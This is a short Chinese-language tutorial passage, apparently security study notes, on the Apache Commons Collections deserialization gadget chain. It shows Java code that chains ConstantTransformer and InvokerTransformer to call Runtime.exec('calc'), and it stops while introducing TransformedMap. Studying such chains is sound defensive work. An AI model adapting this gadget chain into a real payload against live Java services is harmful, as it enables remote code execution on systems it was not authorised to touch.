**ChainedTransformer**

 ChainedTransformer类的transform方法会链式调用transformers数组中的每个Transformer的transform方法

![image-20260318194737941](image-20260318194737941.png)

### 通过ChainedTransformer rce

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
public class ChainTransformer1 {
    public static void main(String[] args) {

        //构造恶意Transformer类

        ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.class);

        InvokerTransformer invokerTransformer1 = new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]});//返回Runtime.getRuntime()方法类对象

        InvokerTransformer invokerTransformer2 = new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]});

        InvokerTransformer invokerTransformer3 = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});


        ChainedTransformer chainedTransformers = new ChainedTransformer(new Transformer[]{constantTransformer, invokerTransformer1, invokerTransformer2, invokerTransformer3});

        chainedTransformers.transform(null);

    }
}
```

**TransformerMap**

我们需要TransformedMap类将我们上面构造好的链子打包在这个类中 等待触发

由于该类的构造器是受保护的 我们可以直接通过decorate方法创建一个实例

